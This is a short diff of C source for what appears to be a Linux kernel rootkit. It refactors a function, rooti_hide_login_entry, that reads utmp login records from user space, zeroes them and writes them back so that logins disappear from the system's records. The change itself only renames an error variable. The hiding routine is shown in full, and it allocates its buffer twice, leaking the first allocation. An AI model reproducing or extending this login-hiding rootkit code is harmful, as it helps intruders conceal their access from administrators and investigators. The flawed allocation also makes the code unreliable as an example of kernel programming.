@@ -63,7 +63,7 @@ int rooti_hide_login_entry(char *user_buf, size_t count)
 {
     char *kernel_buf = kmalloc(count, GFP_KERNEL);
     struct utmp *utmp_buf;
-    int err;
+    int ret;
 
     kernel_buf = kmalloc(count, GFP_KERNEL);
     if (kernel_buf == NULL) {
@@ -72,9 +72,9 @@ int rooti_hide_login_entry(char *user_buf, size_t count)
     }
     utmp_buf = (struct utmp *)kernel_buf;
 
-    err = copy_from_user(kernel_buf, user_buf, count);
-    if (err > 0) {
-        ROOTI_DEBUG("copy_from_user() failed: %d", err);
+    ret = copy_from_user(kernel_buf, user_buf, count);
+    if (ret > 0) {
+        ROOTI_DEBUG("copy_from_user() failed: %d", ret);
         kfree(kernel_buf);
         return -EFAULT;
     }
@@ -83,9 +83,9 @@ int rooti_hide_login_entry(char *user_buf, size_t count)
         // Filling the buffer with zeros should do the trick
         memset(kernel_buf, 0, count);
 
-        err = copy_to_user(user_buf, kernel_buf, count);
-        if (err > 0) {
-            ROOTI_DEBUG("copy_to_user() failed: %d", err);
+        ret = copy_to_user(user_buf, kernel_buf, count);
+        if (ret > 0) {
+            ROOTI_DEBUG("copy_to_user() failed: %d", ret);
             kfree(kernel_buf);
             return -EFAULT;
         }
